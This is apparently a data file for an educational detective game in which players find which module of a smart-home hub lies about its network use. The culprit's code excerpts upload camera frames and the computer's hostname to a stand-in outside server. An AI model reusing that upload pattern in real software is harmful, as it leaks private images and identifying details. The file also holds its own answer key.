@@ -1,0 +1,689 @@
+{
+ "schema": 1,
+ "id": "case-6",
+ "title": "The Camera in the Hallway",
+ "difficulty": "Detective",
+ "briefing": "Home Hub is a small smart home controller. Two crew members use the network, and both say so. Only one of them leaves the house. Compare where each connection goes: REA reports the exact address every request is aimed at.",
+ "plainBriefing": "Home Hub is a small controller for the lamps, the heating and the camera at the front door. Two parts use the internet connection, and both say so. One only talks to a device inside your house. The other sends things outside. Find out which one is lying.",
+ "hints": [
+  "Two crew members use the network. The question is not whether, but WHERE they send things.",
+  "An address that starts with 192.168 is a device inside the house. Look for the crew member whose story says \"stays home\" while the scanner shows an outside address.",
+  "It is the Lens. Show the clue about the outside server and the one about your computer's name."
+ ],
+ "realLife": "Smart cameras and doorbells are a real privacy question. The tell is simple: does the device only talk to something inside your home, or to a company server? An address such as 192.168.x.x is private, so it is not reachable from outside.",
+ "shipName": "Home Hub",
+ "rea": {
+  "tool": "rea-agents",
+  "version": "6.7.0",
+  "command": "rea analyze-javascript-application <ship> --json",
+  "rawSha256": "f534454aadadb375e25412b9bda887f206c674ceb3e798c534d80469888bc58b"
+ },
+ "questions": [
+  {
+   "id": "q1",
+   "text": "What is your job on the ship?"
+  },
+  {
+   "id": "q2",
+   "text": "What do you read or write?"
+  },
+  {
+   "id": "q3",
+   "text": "Do you ever leave the ship?"
+  }
+ ],
+ "crew": [
+  {
+   "id": "main",
+   "file": "main.js",
+   "name": "Captain",
+   "color": "blue",
+   "role": "Starts the hub and calls the other parts.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "main:import-local:2:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./lights.js",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./lights.js\"",
+     "plain": "Works together with another crew member (lights)",
+     "spec": "./lights.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// main.js: the Captain. Starts the home hub.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import { connect } from './lights.js';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "import { setTarget } from './thermostat.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:3:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./thermostat.js",
+     "line": 3,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./thermostat.js\"",
+     "plain": "Works together with another crew member (thermostat)",
+     "spec": "./thermostat.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "import { connect } from './lights.js';",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "import { setTarget } from './thermostat.js';",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "import { start } from './schedule.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:4:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./schedule.js",
+     "line": 4,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./schedule.js\"",
+     "plain": "Works together with another crew member (schedule)",
+     "spec": "./schedule.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 3,
+       "text": "import { setTarget } from './thermostat.js';",
+       "hit": false
+      },
+      {
+       "n": 4,
+       "text": "import { start } from './schedule.js';",
+       "hit": true
+      },
+      {
+       "n": 5,
+       "text": "import { announce } from './bell.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:5:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./bell.js",
+     "line": 5,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./bell.js\"",
+     "plain": "Works together with another crew member (bell)",
+     "spec": "./bell.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 4,
+       "text": "import { start } from './schedule.js';",
+       "hit": false
+      },
+      {
+       "n": 5,
+       "text": "import { announce } from './bell.js';",
+       "hit": true
+      },
+      {
+       "n": 6,
+       "text": "import { snapshot } from './camera.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:6:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./camera.js",
+     "line": 6,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./camera.js\"",
+     "plain": "Works together with another crew member (camera)",
+     "spec": "./camera.js",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 5,
+       "text": "import { announce } from './bell.js';",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "import { snapshot } from './camera.js';",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I start the hub and call the lamps, the heating, the clock, the bell and the camera.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I do not read or write files myself.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "I do not go online myself. The parts that need it do that.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "lights",
+   "file": "lights.js",
+   "name": "Lamplighter",
+   "color": "orange",
+   "role": "Switches the lamps through the lamp hub on the home network.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "lights:request:3:17",
+     "file": "lights.js",
+     "kind": "request",
+     "key": "request",
+     "line": 3,
+     "col": 17,
+     "tags": [
+      "network"
+     ],
+     "text": "Builds an outgoing network request",
+     "plain": "Sends a message out over the internet",
+     "rea": "semantic_graph.relations[constructs-request]",
+     "code": [
+      {
+       "n": 2,
+       "text": "export function connect(onChange) {",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "  const socket = new WebSocket('ws://192.168.0.20:8080/lights');",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "  socket.onmessage = (message) => onChange(JSON.parse(message.data));",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "lights:endpoint:3:17",
+     "file": "lights.js",
+     "kind": "endpoint",
+     "key": "ws://192.168.0.20:8080/lights",
+     "line": 3,
+     "col": 17,
+     "tags": [
+      "network"
+     ],
+     "text": "Talks to the route \"ws://192.168.0.20:8080/lights\"",
+     "plain": "Talks to a specific page on a server: ws://192.168.0.20:8080/lights",
+     "rea": "graph.nodes[endpoint]",
+     "code": [
+      {
+       "n": 2,
+       "text": "export function connect(onChange) {",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "  const socket = new WebSocket('ws://192.168.0.20:8080/lights');",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "  socket.onmessage = (message) => onChange(JSON.parse(message.data));",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I switch the lamps through the lamp hub. I do use the network, to talk to it.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write no files and I do not look at who you are.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "Yes, but only to the lamp hub inside this house.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "thermostat",
+   "file": "thermostat.js",
+   "name": "Warmer",
+   "color": "green",
+   "role": "Remembers the temperature you want.",
+   "quiet": true,
+   "evidence": [
+    {
+     "id": "thermostat:quiet",
+     "file": "thermostat.js",
+     "kind": "quiet",
+     "line": 0,
+     "col": 0,
+     "tags": [],
+     "derived": true,
+     "text": "REA found no imports, requests, file access or user-info reads in this file.",
+     "plain": "The scanner found nothing worth noting here. This part just does its small job quietly.",
+     "code": []
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I remember the temperature you want, between 10 and 30 degrees.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write nothing.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I am a number in memory.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "schedule",
+   "file": "schedule.js",
+   "name": "Clockwork",
+   "color": "yellow",
+   "role": "Wakes the hub up once a minute.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "schedule:timer:3:9",
+     "file": "schedule.js",
+     "kind": "timer",
+     "key": "setInterval",
+     "line": 3,
+     "col": 9,
+     "tags": [
+      "background-timer"
+     ],
+     "text": "Sets a repeating timer (setInterval, every 60 s)",
+     "plain": "Keeps running something in the background, every 60 seconds",
+     "rea": "semantic_graph.relations[schedules-timer]",
+     "code": [
+      {
+       "n": 2,
+       "text": "export function start(tick) {",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "  return setInterval(tick, 60000);",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "}",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I wake the hub once a minute so the others can check in.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write nothing.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I am just a clock.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "bell",
+   "file": "bell.js",
+   "name": "Bell",
+   "color": "cyan",
+   "role": "Shows alerts on the screen.",
+   "quiet": true,
+   "evidence": [
+    {
+     "id": "bell:quiet",
+     "file": "bell.js",
+     "kind": "quiet",
+     "line": 0,
+     "col": 0,
+     "tags": [],
+     "derived": true,
+     "text": "REA found no imports, requests, file access or user-info reads in this file.",
+     "plain": "The scanner found nothing worth noting here. This part just does its small job quietly.",
+     "code": []
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I show alerts on the screen.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "Nothing in, nothing out. Only the screen.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I never leave the screen.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "camera",
+   "file": "camera.js",
+   "name": "Lens",
+   "color": "pink",
+   "role": "Says it takes a picture and keeps the latest one on this machine.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "camera:import-builtin:2:0",
+     "file": "camera.js",
+     "kind": "import-builtin",
+     "key": "node:fs",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "file-module"
+     ],
+     "text": "Imports the file module \"node:fs\"",
+     "plain": "Is able to read and write files",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// camera.js: the Lens. Takes a picture of the front door.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "import os from 'node:os';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "camera:import-builtin:3:0",
+     "file": "camera.js",
+     "kind": "import-builtin",
+     "key": "node:os",
+     "line": 3,
+     "col": 0,
+     "tags": [
+      "os-info"
+     ],
+     "text": "Imports \"node:os\", which can describe this machine and its user",
+     "plain": "Is able to look up details about this computer",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "import os from 'node:os';",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "camera:file-write:6:2",
+     "file": "camera.js",
+     "key": "writeFileSync",
+     "line": 6,
+     "col": 2,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-write",
+     "tags": [
+      "file-write"
+     ],
+     "text": "Writes a file (writeFileSync)",
+     "plain": "Writes to a file on your computer",
+     "code": [
+      {
+       "n": 5,
+       "text": "export async function snapshot(frame) {",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "  fs.writeFileSync('/tmp/last-frame.bin', frame);",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "  await fetch('https://frames.homehub-cloud.example/upload', {",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "camera:request:7:8",
+     "file": "camera.js",
+     "kind": "request",
+     "key": "request",
+     "line": 7,
+     "col": 8,
+     "tags": [
+      "network"
+     ],
+     "text": "Builds an outgoing network request",
+     "plain": "Sends a message out over the internet",
+     "rea": "semantic_graph.relations[constructs-request]",
+     "code": [
+      {
+       "n": 6,
+       "text": "  fs.writeFileSync('/tmp/last-frame.bin', frame);",
+       "hit": false
+      },
+      {
+       "n": 7,
+       "text": "  await fetch('https://frames.homehub-cloud.example/upload', {",
+       "hit": true
+      },
+      {
+       "n": 8,
+       "text": "    method: 'POST',",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "camera:endpoint:7:8",
+     "file": "camera.js",
+     "kind": "endpoint",
+     "key": "https://frames.homehub-cloud.example/upload",
+     "line": 7,
+     "col": 8,
+     "tags": [
+      "network"
+     ],
+     "text": "Talks to the route \"https://frames.homehub-cloud.example/upload\"",
+     "plain": "Talks to a specific page on a server: https://frames.homehub-cloud.example/upload",
+     "rea": "graph.nodes[endpoint]",
+     "code": [
+      {
+       "n": 6,
+       "text": "  fs.writeFileSync('/tmp/last-frame.bin', frame);",
+       "hit": false
+      },
+      {
+       "n": 7,
+       "text": "  await fetch('https://frames.homehub-cloud.example/upload', {",
+       "hit": true
+      },
+      {
+       "n": 8,
+       "text": "    method: 'POST',",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "camera:reads-user-info:9:33",
+     "file": "camera.js",
+     "key": "hostname",
+     "line": 9,
+     "col": 33,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "reads-user-info",
+     "tags": [
+      "user-info"
+     ],
+     "text": "Reads \"hostname\", which identifies the player or their machine",
+     "plain": "Looks up your computer's name",
+     "code": [
+      {
+       "n": 8,
+       "text": "    method: 'POST',",
+       "hit": false
+      },
+      {
+       "n": 9,
+       "text": "    body: JSON.stringify({ home: os.hostname(), frame: frame.toString('base64') }),",
+       "hit": true
+      },
+      {
+       "n": 10,
+       "text": "  });",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I keep the latest picture in a temporary file on this machine. That is all.",
+     "contradictedBy": [
+      "camera:request:7:8",
+      "camera:endpoint:7:8"
+     ]
+    },
+    "q2": {
+     "text": "I only record. I never look up who you are or which computer I am on.",
+     "contradictedBy": [
+      "camera:reads-user-info:9:33"
+     ]
+    },
+    "q3": {
+     "text": "My pictures never leave the house.",
+     "contradictedBy": [
+      "camera:request:7:8",
+      "camera:endpoint:7:8"
+     ]
+    }
+   }
+  }
+ ],
+ "edges": [
+  {
+   "from": "main",
+   "to": "schedule",
+   "line": 4
+  },
+  {
+   "from": "main",
+   "to": "bell",
+   "line": 5
+  },
+  {
+   "from": "main",
+   "to": "camera",
+   "line": 6
+  },
+  {
+   "from": "main",
+   "to": "thermostat",
+   "line": 3
+  },
+  {
+   "from": "main",
+   "to": "lights",
+   "line": 2
+  }
+ ],
+ "imposter": "camera",
+ "verdict": "The Lens said its pictures never leave the house. REA found it posts to an outside server and includes your computer's name.",
+ "why": {
+  "network": "A camera that keeps its pictures \"at home\" has no reason to talk to a server outside the house.",
+  "user-info": "Uploading a picture does not need your computer's name, and it makes it easy to match pictures to a home."
+ },
+ "redHerring": {
+  "crew": "lights",
+  "note": "The Lamplighter uses the network, but only to the lamp hub at a private address inside the house, and it said so. REA shows one connection and nothing about you or your files."
+ }
+}
